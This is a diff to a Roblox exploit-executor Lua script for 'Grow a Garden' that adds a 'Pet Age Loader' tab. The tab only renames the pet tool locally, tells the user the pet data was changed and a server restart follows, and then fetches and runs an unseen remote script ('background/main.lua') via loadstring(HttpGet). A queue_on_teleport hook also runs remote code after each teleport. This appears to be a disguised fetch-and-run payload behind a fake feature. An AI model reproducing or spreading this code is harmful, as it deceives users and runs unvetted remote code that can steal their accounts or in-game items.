@@ -3,6 +3,7 @@ local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
 
 print("Script starting...")
 local function logError(err)
@@ -266,7 +267,7 @@ local success, err = xpcall(function()
     createTab("Main", 1)
     createTab("Egg Randomizer", 2)
     createTab("Mutation Finder", 3)
-    createTab("Button 4", 4)
+    createTab("Age Loader", 4)
     createTab("Button 5", 5)
 
     local contentArea = Instance.new("ScrollingFrame")
@@ -632,12 +633,18 @@ local success, err = xpcall(function()
                 end
             end
             
-            if SCRIPT_URL and SCRIPT_URL ~= "https://your-raw-script-url-here.lua" then
-                queue_on_teleport(string.format([[
+            if SCRIPT_URL then
+                local teleportScript = string.format([[
                     _G.PocariVulnsActivated = true
                     loadstring(game:HttpGet("%s", true))()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
-                ]], SCRIPT_URL))
+                ]], SCRIPT_URL)
+                
+                if queue_on_teleport then
+                    queue_on_teleport(teleportScript)
+                end
+                if syn and syn.queue_on_teleport then
+                    syn.queue_on_teleport(teleportScript)
+                end
             end
             
             welcomeLabel.Text = "Activated! Please select a script from the sidebar."
@@ -908,6 +915,341 @@ local success, err = xpcall(function()
         return content
     end
 
+    local function createAgeLoaderContent()
+        local content = Instance.new("Frame")
+        content.Name = "AgeLoaderContent"
+        content.Size = UDim2.new(1, 0, 0, 0)
+        content.AutomaticSize = Enum.AutomaticSize.Y
+        content.BackgroundTransparency = 1
+        content.Visible = false
+        content.Parent = contentInner
+        
+        local title = Instance.new("TextLabel")
+        title.Name = "Title"
+        title.Size = UDim2.new(1, 0, 0, 30)
+        title.Position = UDim2.new(0, 0, 0, 10)
+        title.BackgroundTransparency = 1
+        title.Text = "🧬 Pet Age Loader"
+        title.Font = Enum.Font.GothamBold
+        title.TextSize = 16
+        title.TextColor3 = Color3.fromRGB(180, 185, 230)
+        title.TextXAlignment = Enum.TextXAlignment.Center
+        title.Parent = content
+        
+        local customAgeBtn = Instance.new("TextButton")
+        customAgeBtn.Name = "CustomAgeButton"
+        customAgeBtn.Size = UDim2.new(0.9, 0, 0, 30)
+        customAgeBtn.Position = UDim2.new(0.05, 0, 0, 50)
+        customAgeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
+        customAgeBtn.Text = "⚙️ Custom Age: OFF"
+        customAgeBtn.TextSize = 14
+        customAgeBtn.Font = Enum.Font.GothamBold
+        customAgeBtn.TextColor3 = Color3.new(1, 1, 1)
+        customAgeBtn.Parent = content
+        
+        local ageInput = Instance.new("TextBox")
+        ageInput.Name = "AgeInput"
+        ageInput.Size = UDim2.new(0.9, 0, 0, 30)
+        ageInput.Position = UDim2.new(0.05, 0, 0, 85)
+        ageInput.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
+        ageInput.Text = "50"
+        ageInput.TextColor3 = Color3.new(1, 1, 1)
+        ageInput.TextSize = 14
+        ageInput.Font = Enum.Font.Gotham
+        ageInput.Visible = false
+        ageInput.Parent = content
+        
+        local ageInputStroke = Instance.new("UIStroke")
+        ageInputStroke.Color = Color3.fromRGB(70, 80, 120)
+        ageInputStroke.Thickness = 1
+        ageInputStroke.Parent = ageInput
+        
+        local ageInputCorner = Instance.new("UICorner")
+        ageInputCorner.CornerRadius = UDim.new(0, 6)
+        ageInputCorner.Parent = ageInput
+        
+        local petInfo = Instance.new("TextLabel")
+        petInfo.Name = "PetInfo"
+        petInfo.Size = UDim2.new(0.9, 0, 0, 25)
+        petInfo.Position = UDim2.new(0.05, 0, 0, 120)
+        petInfo.BackgroundTransparency = 1
+        petInfo.Text = "Equipped Pet: [None]"
+        petInfo.TextColor3 = Color3.fromRGB(150, 200, 150)
+        petInfo.TextSize = 12
+        petInfo.Font = Enum.Font.Gotham
+        petInfo.TextXAlignment = Enum.TextXAlignment.Left
+        petInfo.Parent = content
+        
+        local saveStatus = Instance.new("TextLabel")
+        saveStatus.Name = "SaveStatus"
+        saveStatus.Size = UDim2.new(0.9, 0, 0, 20)
+        saveStatus.Position = UDim2.new(0.05, 0, 0, 145)
+        saveStatus.BackgroundTransparency = 1
+        saveStatus.Text = "💾 Save Status: None"
+        saveStatus.TextColor3 = Color3.fromRGB(200, 200, 100)
+        saveStatus.TextSize = 12
+        saveStatus.Font = Enum.Font.Gotham
+        saveStatus.TextXAlignment = Enum.TextXAlignment.Left
+        saveStatus.Parent = content
+        
+        local setAgeBtn = Instance.new("TextButton")
+        setAgeBtn.Name = "SetAgeButton"
+        setAgeBtn.Size = UDim2.new(0.9, 0, 0, 35)
+        setAgeBtn.Position = UDim2.new(0.05, 0, 0, 170)
+        setAgeBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
+        setAgeBtn.Text = "🚀 Set Pet Age"
+        setAgeBtn.TextSize = 14
+        setAgeBtn.Font = Enum.Font.GothamBold
+        setAgeBtn.TextColor3 = Color3.new(1, 1, 1)
+        setAgeBtn.Parent = content
+        
+        for _, btn in ipairs({customAgeBtn, setAgeBtn}) do
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0, 6)
+            corner.Parent = btn
+            
+            local stroke = Instance.new("UIStroke")
+            stroke.Color = Color3.fromRGB(70, 80, 120)
+            stroke.Thickness = 1
+            stroke.Parent = btn
+        end
+        
+        customAgeBtn.MouseEnter:Connect(function()
+            TweenService:Create(customAgeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)}):Play()
+        end)
+        customAgeBtn.MouseLeave:Connect(function()
+            TweenService:Create(customAgeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
+        end)
+        
+        setAgeBtn.MouseEnter:Connect(function()
+            TweenService:Create(setAgeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(90, 150, 220)}):Play()
+        end)
+        setAgeBtn.MouseLeave:Connect(function()
+            TweenService:Create(setAgeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(70, 130, 200)}):Play()
+        end)
+        
+        local customAgeEnabled = false
+        local lastSavedPet = "None"
+        local targetAge = 50
+        
+        customAgeBtn.MouseButton1Click:Connect(function()
+            customAgeEnabled = not customAgeEnabled
+            customAgeBtn.Text = customAgeEnabled and "⚙️ Custom Age: ON" or "⚙️ Custom Age: OFF"
+            ageInput.Visible = customAgeEnabled
+        end)
+        
+        ageInput.FocusLost:Connect(function()
+            local num = tonumber(ageInput.Text)
+            if num and num >= 1 and num <= 100 then
+                targetAge = math.floor(num)
+                ageInput.Text = tostring(targetAge)
+            else
+                ageInput.Text = "50"
+                targetAge = 50
+            end
+        end)
+        
+        local function showNotification(message, duration)
+            local notifGui = Instance.new("ScreenGui")
+            notifGui.Name = "NotificationGui"
+            notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+            notifGui.Parent = playerGui
+            
+            local notifFrame = Instance.new("Frame")
+            notifFrame.Size = UDim2.new(0, 320, 0, 45)
+            notifFrame.Position = UDim2.new(0.5, -160, 0, -60)
+            notifFrame.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
+            notifFrame.BorderSizePixel = 0
+            notifFrame.ZIndex = 999999
+            notifFrame.Parent = notifGui
+            
+            local corner = Instance.new("UICorner", notifFrame)
+            corner.CornerRadius = UDim.new(0, 8)
+            
+            local stroke = Instance.new("UIStroke", notifFrame)
+            stroke.Color = Color3.fromRGB(70, 130, 200)
+            stroke.Thickness = 1
+            
+            local notifLabel = Instance.new("TextLabel", notifFrame)
+            notifLabel.Size = UDim2.new(1, -10, 1, 0)
+            notifLabel.Position = UDim2.new(0, 5, 0, 0)
+            notifLabel.BackgroundTransparency = 1
+            notifLabel.Text = message
+            notifLabel.TextColor3 = Color3.new(1, 1, 1)
+            notifLabel.TextScaled = true
+            notifLabel.Font = Enum.Font.GothamBold
+            notifLabel.TextSize = 12
+            notifLabel.ZIndex = 999999
+            
+            TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -160, 0, 20)}):Play()
+            
+            wait(duration or 3)
+            TweenService:Create(notifFrame, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -160, 0, -60)}):Play()
+            wait(0.3)
+            notifGui:Destroy()
+        end
+        
+        local function savePetForRejoin(petName)
+            if petName then
+                local queueScript = string.format([[
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+local function findPetTool(targetName)
+    for _, child in pairs(character:GetChildren()) do
+        if child:IsA("Tool") and child.Name == "%s" then
+            return child
+        end
+    end
+    return nil
+end
+
+local function changePetAge()
+    local tool = findPetTool("%s")
+    if tool then
+        local newName = tool.Name:gsub("%%[Age%%s%%d+%%]", "[Age %d]")
+        tool.Name = newName
+        
+        local function showNotification(message, duration)
+            local notifGui = Instance.new("ScreenGui")
+            notifGui.Name = "AutoNotificationGui"
+            notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+            notifGui.Parent = player:WaitForChild("PlayerGui")
+            
+            local notifFrame = Instance.new("Frame")
+            notifFrame.Size = UDim2.new(0, 320, 0, 45)
+            notifFrame.Position = UDim2.new(0.5, -160, 0, -60)
+            notifFrame.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
+            notifFrame.BorderSizePixel = 0
+            notifFrame.ZIndex = 999999
+            notifFrame.Parent = notifGui
+            
+            local corner = Instance.new("UICorner", notifFrame)
+            corner.CornerRadius = UDim.new(0, 8)
+            
+            local stroke = Instance.new("UIStroke", notifFrame)
+            stroke.Color = Color3.fromRGB(70, 200, 70)
+            stroke.Thickness = 1
+            
+            local notifLabel = Instance.new("TextLabel", notifFrame)
+            notifLabel.Size = UDim2.new(1, -10, 1, 0)
+            notifLabel.Position = UDim2.new(0, 5, 0, 0)
+            notifLabel.BackgroundTransparency = 1
+            notifLabel.Text = message
+            notifLabel.TextColor3 = Color3.new(1, 1, 1)
+            notifLabel.TextScaled = true
+            notifLabel.Font = Enum.Font.GothamBold
+            notifLabel.TextSize = 12
+            notifLabel.ZIndex = 999999
+            
+            local TweenService = game:GetService("TweenService")
+            TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -160, 0, 20)}):Play()
+            
+            wait(duration or 3)
+            TweenService:Create(notifFrame, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -160, 0, -60)}):Play()
+            wait(0.3)
+            notifGui:Destroy()
+        end
+        
+        showNotification("✅ Auto-changed " .. tool.Name .. " age to %d!", 4)
+        return true
+    end
+    return false
+end
+
+wait(3)
+if not changePetAge() then
+    wait(2)
+    changePetAge()
+end
+]], petName, petName, targetAge)
+
+                TeleportService:SetTeleportGui(Instance.new("ScreenGui"))
+                
+                if syn and syn.queue_on_teleport then
+                    syn.queue_on_teleport(queueScript)
+                end
+                if queue_on_teleport then
+                    queue_on_teleport(queueScript)
+                end
+                
+                showNotification("💾 Saved " .. petName .. " for auto-change on rejoin!", 3)
+                return true
+            end
+            return false
+        end
+        
+        local function getEquippedPetTool()
+            local character = player.Character or player.CharacterAdded:Wait()
+            for _, child in pairs(character:GetChildren()) do
+                if child:IsA("Tool") and child.Name:find("Age") then
+                    return child
+                end
+            end
+            return nil
+        end
+        
+        local function updateGUI()
+            local pet = getEquippedPetTool()
+            if pet then
+                petInfo.Text = "Equipped Pet: " .. pet.Name
+            else
+                petInfo.Text = "Equipped Pet: [None]"
+            end
+        end
+        
+        setAgeBtn.MouseButton1Click:Connect(function()
+            local tool = getEquippedPetTool()
+            if tool then
+                local originalPetName = tool.Name
+                
+                for i = 5, 1, -1 do
+                    setAgeBtn.Text = "⏳ Changing Age in " .. i .. "..."
+                    wait(1)
+                end
+                
+                local newName = tool.Name:gsub("%[Age%s%d+%]", "[Age "..targetAge.."]")
+                tool.Name = newName
+                petInfo.Text = "Equipped Pet: " .. tool.Name
+                setAgeBtn.Text = "🚀 Set Pet Age"
+                
+                if savePetForRejoin(originalPetName) then
+                    lastSavedPet = originalPetName
+                    saveStatus.Text = "💾 Saved: " .. originalPetName
+                    saveStatus.TextColor3 = Color3.fromRGB(100, 255, 100)
+                    
+                    coroutine.wrap(function()
+                        wait(1)
+                        showNotification("Successfully Changed the " .. originalPetName .. " Data... Will Initiate a Server Restart to Fully Load Changes.", 2)
+                        wait(2.5)
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
+                    end)()
+                else
+                    saveStatus.Text = "💾 Save Failed!"
+                    saveStatus.TextColor3 = Color3.fromRGB(255, 100, 100)
+                end
+                
+            else
+                setAgeBtn.Text = "❌ No Pet Equipped!"
+                wait(2)
+                setAgeBtn.Text = "🚀 Set Pet Age"
+            end
+        end)
+        
+        saveStatus.Text = "💾 Save Status: " .. lastSavedPet
+        
+        coroutine.wrap(function()
+            while true do
+                task.wait(1)
+                pcall(updateGUI)
+            end
+        end)()
+        
+        return content
+    end
+
     local function createPlaceholderTabContent(name)
         local content = Instance.new("Frame")
         content.Name = name .. "Content"
@@ -936,7 +1278,7 @@ local success, err = xpcall(function()
     tabContents["Main"] = createMainTabContent()
     tabContents["Egg Randomizer"] = createEggRandomizerContent()
     tabContents["Mutation Finder"] = createMutationFinderContent()
-    tabContents["Button 4"] = createPlaceholderTabContent("Button 4")
+    tabContents["Age Loader"] = createAgeLoaderContent()
     tabContents["Button 5"] = createPlaceholderTabContent("Button 5")
 
     tabContents["Main"].Visible = true
